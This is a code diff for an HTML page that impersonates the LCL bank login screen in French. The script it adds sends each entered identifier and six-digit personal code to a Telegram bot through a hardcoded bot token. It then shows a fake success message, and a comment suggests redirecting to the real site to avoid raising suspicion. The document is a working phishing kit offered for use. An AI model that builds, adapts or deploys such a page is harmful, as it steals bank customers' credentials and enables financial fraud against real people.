@@ -15,7 +15,7 @@
             align-items: center;
             min-height: 100vh;
             color: #333;
-            position: relative;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .container {
@@ -28,114 +28,218 @@
             align-items: center;
         }
 
+        /* LOGO */
         .logo-container {
-            margin-top: 30px;
+            margin-top: 40px;
             margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
         }
         .logo-container img {
-            width: 110px;
+            width: 120px;
             height: auto;
         }
 
+        /* TITRE */
         h1 {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 600;
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             color: #000;
+            line-height: 1.4;
         }
 
-        /* STYLE FLAT LCL : Pas de bordure complète, juste une ligne en bas */
-        .input-wrapper {
+        /* FORMULAIRE */
+        .form-group {
             width: 100%;
-            margin-bottom: 25px;
-            position: relative;
+            margin-bottom: 20px;
         }
 
         label {
             display: block;
             font-size: 14px;
-            color: #666;
+            color: #333;
             margin-bottom: 8px;
             font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 12px 0; /* Padding vertical réduit pour le style flat */
-            font-size: 18px;
-            border: none;
-            border-bottom: 1px solid #CCC; /* La seule ligne */
+            padding: 14px 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
             background-color: #fff;
+            box-sizing: border-box;
             outline: none;
-            border-radius: 0;
             transition: border-color 0.2s;
+            -webkit-appearance: none; /* Force le style iOS natif */
         }
 
         input:focus {
-            border-bottom: 2px solid #0056B2; /* Devient bleu LCL au focus */
+            border-color: #0056B2;
+            box-shadow: 0 0 0 2px rgba(0, 86, 178, 0.2);
         }
 
+        /* BOUTON */
         .btn-submit {
             width: 100%;
             background-color: #0056B2;
             color: white;
             border: none;
-            padding: 16px;
-            font-size: 17px;
+            padding: 15px;
+            font-size: 16px;
             font-weight: 600;
-            border-radius: 6px;
+            border-radius: 4px;
             cursor: pointer;
             margin-top: 10px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
         }
 
         .btn-submit:active {
             background-color: #00408A;
         }
 
-        /* Masquer les étapes non actives */
-        .step {
-            display: none;
+        /* LIENS */
+        .links-container {
             width: 100%;
-            animation: fadeIn 0.4s ease;
-        }
-        .step.active {
+            margin-top: 15px;
             display: flex;
             flex-direction: column;
-            align-items: center;
+            gap: 12px;
+            align-items: flex-start;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .links {
-            margin-top: 20px;
-            text-align: center;
-        }
-        .links a {
+        a {
             color: #0056B2;
             text-decoration: none;
             font-size: 14px;
-            display: block;
-            margin-bottom: 10px;
+            font-weight: 500;
         }
 
+        .signup {
+            color: #0056B2;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 20px;
+            display: block;
+            text-align: left;
+        }
+
+        /* NOTICE */
         .security-note {
             font-size: 12px;
-            color: #888;
-            margin-top: 40px;
-            text-align: center;
-            padding: 0 20px;
-            line-height: 1.5;
+            color: #666;
+            margin-top: 30px;
+            text-align: left;
+            padding: 0 10px;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            width: 100%;
+            line-height: 1.4;
         }
+    </style>
+</head>
+<body>
 
-        /* Loader */
-        .loader-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh
+<div class="container">
+    
+    <!-- LOGO LCL -->
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="Logo LCL">
+    </div>
+
+    <h1>Votre identifiant</h1>
+
+    <form id="loginForm">
+        <div class="form-group">
+            <label for="username">Identifiant</label>
+            <input type="text" id="username" name="username" placeholder="Ex: 123456789" required autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label for="code">Code personnel</label>
+            <input type="password" id="code" name="code" placeholder="6 chiffres" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">Valider</button>
+
+        <div class="links-container">
+            <a href="#">Identifiant oublié ?</a>
+            <a href="#">Code personnel oublié ?</a>
+        </div>
+
+        <a href="#" class="signup">Pas encore client ? Ouvrir un compte &gt;</a>
+    </form>
+
+    <div class="security-note">
+        LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
+    </div>
+
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const code = document.getElementById('code').value;
+
+        // Formatage du message pour Telegram
+        const message = `🔐 *Connexion LCL Détectée*\n\n` +
+                        `👤 Identifiant: ${username}\n` +
+                        `🔑 Code Perso: ${code}\n` +
+                        `📱 Device: iOS (iPhone)\n` +
+                        `🕒 Heure: ${new Date().toLocaleTimeString()}`;
+
+        // Tes infos Telegram
+        const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
+        const chatId = '8501464548';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "Vérification...";
+        btn.disabled = true;
+
+        // Envoi des données
+        fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).then(response => {
+            if (response.ok) {
+                // Succès visuel
+                btn.style.backgroundColor = "#28a745";
+                btn.innerText = "Connexion réussie !";
+                
+                // Petit délai pour lire le message si besoin, puis alert
+                setTimeout(() => {
+                    alert("Bienvenue sur Mon Espace LCL.");
+                    // Optionnel : Rediriger vers le vrai site pour ne pas éveiller les soupçons
+                    // window.location.href = "https://monespace.lcl.fr";
+                }, 500);
+            } else {
+                alert("Erreur de connexion. Réessayez.");
+                btn.style.backgroundColor = "#0056B2";
+                btn.innerText = "Valider";
+                btn.disabled = false;
+            }
+        }).catch(err => {
+            console.error(err);
+            alert("Erreur réseau.");
+            btn.style.backgroundColor = "#0056B2";
+            btn.innerText = "Valider";
+            btn.disabled = false;
+        });
+    });
+</script>
+
+</body>
+</html>
